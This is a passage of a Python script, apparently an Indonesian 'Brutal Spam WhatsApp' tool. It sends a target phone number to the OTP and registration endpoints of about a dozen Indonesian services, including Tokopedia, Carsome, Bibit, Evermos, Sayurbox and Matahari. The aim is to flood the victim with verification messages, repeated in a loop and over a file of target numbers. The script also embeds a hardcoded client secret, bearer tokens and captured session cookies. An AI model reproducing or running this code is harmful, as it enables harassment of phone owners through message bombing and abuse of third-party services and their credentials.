		sys.exit(f"  {putih}[{R}!{putih}] Program Dihentikan")
def view_tanya():
	try:
		choice=inquirer.list_input("Back Tools? ",choices=["Back Tools \033[1;97m(\033[1;93m01\033[1;97m)","\033[31;1mExit \033[1;0mTools (\033[1;93m02\033[1;97m)"])
		if choice == "Back Tools \033[1;97m(\033[1;93m01\033[1;97m)":
			os.system("clear")
			print (banner)
			time.sleep(3)
			tanya()
		elif choice == "\033[31;1mExit \033[1;0mTools \033[1;97m(\033[1;93m02\033[1;97m)":
			sys.exit()
	except KeyboardInterrupt:
		sys.exit(f"  {putih}[{R}!{putih}] Program Dihentikan")

def view_target():
	try:
		a=0
		gas=open('target.txt','r').readlines()
		for line in gas:
			a += 1
			number=line.strip()
			print (f"{putih}[{H}•{putih}] Target {Y}{a} {R}:{Y} {number}")
		view_tanya()
	except KeyboardInterrupt:
                print (f"{W}Program Terminated [{R}!{W}]")
                sys.exit()
	except FileNotFoundError:
		sys.exit(f"{putih}[{R}!{putih}] Target Not Found {R}!")

def mainlagi():
	try:
		choice=inquirer.list_input("Spam Lagi ? (Yes/No) ", choices=["Yes","No"])
		if choice == "Yes":
			time.sleep(3)
			gas()
		elif choice == "No":
			print (f"{putih}[{Y}^_^{putih}] Thanks For Use My Tools")
	except KeyboardInterrupt:
		sys.exit(f"{putih}[{R}!{putih}] Program Dihentikan {R}!{putih}")

def single():
	try:
		nomor = input(f"  {putih}[{R}?{putih}] Nomor {R}:{H} ")
		tokoko=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={'Host':'api-v2.bukuwarung.com','content-length':'198','sec-ch-ua':'"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile':'?0','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','x-app-version-code':'5050','x-app-version-name':'android','buku-origin':'tokoko','sec-ch-ua-platform':'"Linux"','origin':'https://web.tokoko.id','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://web.tokoko.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
		site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}).text # tokped
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1) # tokped
		sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}, data = {'otp_type' : '116','msisdn' : '0'+nomor,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',}).text # send requests tokped
		kukis={'cookie':'ajs_anonymous_id=5a3e8670-63ce-4348-8dca-641748d7d767','cookie':'_ALGOLIA=anonymous-2b34b4e4-c817-499f-a0d4-5930ffbaf7ff','cookie':'_fbp=fb.1.1662046677088.183334261','cookie':'g_state={"i_p":1662053880779,"i_l":1}','cookie':'_hjSessionUser_1895264=eyJpZCI6IjBkNWYwMjNjLWNjMGEtNTVmNi1hYTNkLTgwZmJjYTU5N2RhNiIsImNyZWF0ZWQiOjE2NjIwNDY2NzY2NTgsImV4aXN0aW5nIjp0cnVlfQ==','cookie':'amp_7c6549=BuD_ETdrbio9LDUB2TB6V-...1gc3r9m4s.1gc3r9m4s.0.0.0','cookie':'_clck=1nxlj0s|1|f4l|0','cookie':'tml_t=ab85e71e-ddd0-4317-a14b-1e5a6c202a43','cookie':'amp_4b05bb=jrGWubrrFNjGvlqLBgVTH_...1glb1ck7f.1glb1ck7f.0.0.0','cookie':'__cf_bm=Ee0IbDXhZjy2AiRtIyyK7OhmiIN9OawLBwVyRHC3DLQ-1672186583-0-AdaNbL4+xeIXNO1UbfZ1feHhHZCjnQlkjgARFkyoFJQ117Za5erTm4q2gKEuogBEtNqcxWbNCX/EoBa9wp7auxY=','cookie':'_gcl_aw=GCL.1672186586.CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE','cookie':'_gcl_au=1.1.2101568662.1672186586','cookie':'utm={"utm_source":"Google","utm_medium":"Search","utm_campaign":"EN_AlwaysOn_PureBrand_Exact_Brand_","utm_term":"Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_"}','cookie':'attribution=Google','cookie':'ucif={"src":"Google","med":"Search","camp":"EN_AlwaysOn_PureBrand_Exact_Brand_","cont":"carsome","term":"Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_"}','cookie':'attribution=Google','cookie':'_hjIncludedInSessionSample=0','cookie':'_hjSession_1895264=eyJpZCI6ImE0YTAzNmVkLTBiNzctNGYzOC1hNWZiLTUzODEyM2RlNjU0NCIsImNyZWF0ZWQiOjE2NzIxODY1ODkxMDcsImluU2FtcGxlIjpmYWxzZX0=','cookie':'_hjAbsoluteSessionInProgress=1','cookie':'moe_uuid=30b62d3f-6f5c-46a2-b324-79bb5fdde264','cookie':'_gid=GA1.2.1272855920.1672186591','cookie':'_gac_UA-70043720-4=1.1672186591.CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE','cookie':'_gat_UA-70043720-4=1','cookie':'_ga=GA1.1.651678291.1662046676','cookie':'_ga_L3ZY5XJB08=GS1.1.1672186591.5.0.1672186592.59.0.0','cookie':'tml_s=3ba17acd-ecae-4716-b725-d4176b4c88a1',
	'cookie':'_uetsid=e3fb7eb0864411eda3df3b3860185a56','cookie':'_uetvid=0f040fa02a0c11ed8727e1811f9a3cb3'} # kukis carsome
		carsome=requests.post("https://www.carsome.id/website/login/sendSMS",headers={'Host':'www.carsome.id','content-length':'38','sec-ch-ua':'"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','x-language':'id','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','country':'ID','x-amplitude-device-id':'jrGWubrrFNjGvlqLBgVTH_','sec-ch-ua-platform':'"Android"','origin':'https://www.carsome.id','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.carsome.id/jual-mobil-bekas?utm_source=Google&utm_medium=Search&utm_campaign=EN_AlwaysOn_PureBrand_Exact_Brand_&utm_term=Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_&utm_content=carsome&gclid=CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},cookies=kukis,data=json.dumps({"username":nomor,"optType":1})).text
		bibit=requests.post("https://api.bibit.id/auth/register/phone",headers={'Host':'api.bibit.id','accept':'application/json, text/plain, */*','content-type':'application/json','sec-ch-ua-mobile':'?1','x-platform':'web','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://app.bibit.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://app.bibit.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"code":"62","phone":nomor,"via":"whatsapp","recaptcha_token":"","recaptcha_type":"v3"})).text
		cook={"cookie":"_gcl_au=1.1.909457086.1662115605","cookie":"__gtm_campaign_url=https%3A%2F%2Fevermos.com%2Freg%2Fsitelink_daftar%2F%3Fgclid%3DCj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"__gtm_referrer=https%3A%2F%2Fwww.google.com%2F","cookie":"_gid=GA1.2.1927488580.1662115605","cookie":"_gac_UA-127603098-29=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_gac_UA-127603098-27=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_gcl_aw=GCL.1662115606.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_fbp=fb.1.1662115607118.1815022728","cookie":"_ga_E48JMVJVEG=GS1.1.1662115603.1.0.1662115609.0.0.0","cookie":"poptin_old_user=true","cookie":"poptin_user_id=0.42qy01qhmjj","cookie":"evm_client_token=fd0c103b778b2da4bf5cd3520ff64a500f3f1137","cookie":"evm_version=2.48.14","cookie":"utm_tracker=%7B%22source_link%22%3A%22versionb.ea7%22%7D","cookie":"_ga=GA1.2.56596919.1662115604","cookie":"_gat_gtag_UA_127603098_1=1","cookie":"_gat_UA-127603098-1=1","cookie":"_ga_8NN2ZT44WP=GS1.1.1662115616.1.0.1662115619.0.0.0","cookie":"rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX19cj2GvLExMO7pRcRLevWUUYg9hSlCCKEbtmQAzju4RWUWo22yC%2B3dUMBswi22yZpDc2jU3DHURNmVnOfZLpfGzkMpatP9yCh0%3D","cookie":"rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18v21NYtvQDe7sPj6DM6%2BqN8HCmUTTSGrA%3D","cookie":"_gat=1","cookie":"MgidSensorNVis=2","cookie":"MgidSensorHref=https://evermos.com/registration?source_link=versionb.ea7","cookie":"_gat_%5Bobject%20Object%5D=1","cookie":"afUserId=154dedac-a679-4204-8121-fbd290672de8-p","cookie":"AF_SYNC=1662115627689","cookie":"registered_user=%7B%22verificationToken%22%3Anull%2C%22phone%22%3A%2262"+nomor+"%22%2C%22password%22%3A%22jsjwjwhebe%22%2C%22name%22%3A%22Zgsghshsbs%22%2C%22subDistrictId%22%3A%223175%22%2C%22referral%22%3Anull%7D",
	"cookie":"otp_config=%7B%22action%22%3A%22registration%2FdoRegister%22%2C%22redirectUrl%22%3A%22%2Fcatalog%3FnewUser%3D1%22%7D","cookie":"rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2B%2BfZWMpHNJzHadlZHZva4JNdrFmOCLYIX0Qh5h%2FPDZ8c2htJ%2FhtS9bKg3eddpUadVfLXPe7%2FYiIw%3D%3D","cookie":"amp_e15389=3AYNBj9lB2pDQI8v06V0tC...1gbusvcej.1gbut0lb0.6.0.6"}
		Arifa=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","content-length":"25","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor}),cookies=cook).text
		ruparupa = requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"117","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs","content-type":"application/json","x-company-name":"odi","accept":"application/json","informa-b2b":"false","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","user-platform":"mobile","x-frontend-type":"mobile","sec-ch-ua-platform":"Android","origin":"https://m.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor,"action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0})).text
		js=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
		ken=requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={'Host':'www.sayurbox.com','content-length':'289','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-device-info':'{"platform":"web","is_app":false,"is_mobile":true,"device_type":"mobile","device_id":"LWUOU5jfEtY_43IsmFme_","os_name":"Android","os_version":"11","brand":null,"model":null,"client_ip":"::ffff:10.10.212.88","pixel_density":2}','sec-ch-ua-mobile':'?1','authorization':'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyMzc2NTc0LCJleHAiOjE2NjQ5Njg1NzQsImlhdCI6MTY2MjM3NjU3NCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjFmOWE0NGI0LTE0MTgtNGIyNC1iYTRkLWU0MTEwN2FjOWU2NSIsInN1YiI6IjRwZUpiTjB5cUpuQkd4NDBfMGVWbWV1S3lkYWQiLCJ1c2VyX2lkIjoiNHBlSmJOMHlxSm5CR3g0MF8wZVZtZXVLeWRhZCJ9.hbvAGWui1gSK26sEzhC9l790_JVobzkR3j82ZPi1hIwflbf-f08WTRbTraE7_6U_Q60QetC0Xk-GR3JndHodWuXvMbi0yIum8ghQ2fGG4ZR5F9RdPWOv0k1v10NyxOxUuWdfVUK_wMqoYZGK4klL2B3InPd-WMra4MhX9JoW91LBtpLx-tm5GLzPytX5hHINiqs6hZnvypbIBGqQr5oQp_ruJNezAfUBtYVmHdUahlJs1j9aD8IDF-86NVGGEfLjOMERi1cet4mf8uJmKn9ScIP18XMQVAdoxJnkVTwPQBOvQsP2EOMyh___hYvpjwe2T4qriGD1lpMgP2cHuf-dxw','content-type':'application/json','accept':'*/*','x-bundle-revision':'6.0','x-sbox-tenant':'sayurbox','x-binary-version':'2.2.1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://www.sayurbox.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=js).text
		possing = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",headers={"Host":"www.matahari.com","content-length":"76","x-newrelic-id":"Vg4GVFVXDxAGVVlVBgcGVlY=","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","x-requested-with":"XMLHttpRequest","sec-ch-ua-platform":"Android","origin":"https://www.matahari.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.matahari.com/customer/account/create/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"otp_request":{"mobile_number":"0"+nomor,"mobile_country_code":"+62"}})).text
		segar=requests.post("https://api-v2.segari.id//v1/otps/generate",headers={"Host":"api-v2.segari.id","content-length":"30","accept":"application/json, text/plain, */*","x-segari-platform":"web","origin":"https://segari.id","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","referer":"https://segari.id/login","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":nomor})).text
		al=requests.get("https://www.toyskingdom.co.id/membership/send-otp?cellphone="+nomor+"&otp_type=register&email=tololbet615%40gmail.com",headers={'Host':'www.toyskingdom.co.id','Connection':'keep-alive','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','Accept':'*/*','X-Requested-With':'XMLHttpRequest','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','Sec-Fetch-Site':'same-origin','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://www.toyskingdom.co.id/membership/register/+aqXlp409RHHXTQyyGCurg==/zb3+iKnqYXQ86its61Z4Jg==','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}).text
		ses=requests.post("https://api.pintarnya.com/api/pk/auth/register/mobile",headers={'Host':'api.pintarnya.com','content-length':'27','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','sec-ch-ua-mobile':'?1','authorization':'Bearer undefined','user-agent':'Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','platform':'web-kerja','sec-ch-ua-platform':'"Android"','origin':'https://pintarnya.com','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://pintarnya.com/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"mobile":"+62"+nomor})).text
		pos=requests.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",headers={'Host':'api.duniagames.co.id','content-length':'58','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','accept-language':'id','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','content-type':'application/json','ciam-type':'FR','accept':'application/json, text/plain, */*','x-device':'c44cbb7b-b080-4cd3-8526-a90c0b5d3a98','sec-ch-ua-platform':'"Android"','origin':'https://duniagames.co.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://duniagames.co.id/','accept-encoding':'gzip, deflate, br'},data=json.dumps({"phoneNumber":"+62"+nomor,"userName":"0"+nomor})).text
		print (f"  {putih}[{H}✓{putih}] {putih}Spam WhatsApp Selesai")
		delay(120)
		mainlagi()
	except KeyboardInterrupt:
		sys.exit(f"  {putih}[{R}!{putih}] Program Dihentikan")
	except requests.exceptions.ConnectionError:
		sys.exit(f"  {putih}[{R}!{putih}] Koneksi Error ")

banner=f"""
{R}		[{putih} Brutal Spam {H}WhatsApp{R} ]
{R}	    [{putih} Dibuat Oleh {Y}AmmarBN {R}&{Y} SanzzXD {R}]
{R}	 [{putih} Awali {Y}'{putih}nomor{Y}' {putih}dengan {Y}'{putih}8xxxxxxxx{Y}'{putih} Ya {R}]
{R}	     [{putih} Contac me {R}:{B} t.me/SariiRooti {R}]
{R}      [{putih}Klik '{H}CTRL C{putih}' Untuk Stop{Y}/{putih}Memberhentikan Tools{R}]
{Y}---------------------------------------------------------------"""
def gas():
	os.system("clear")
	print(banner)
	print()
	tanya()

if __name__=='__main__':
	gas()
	#check()

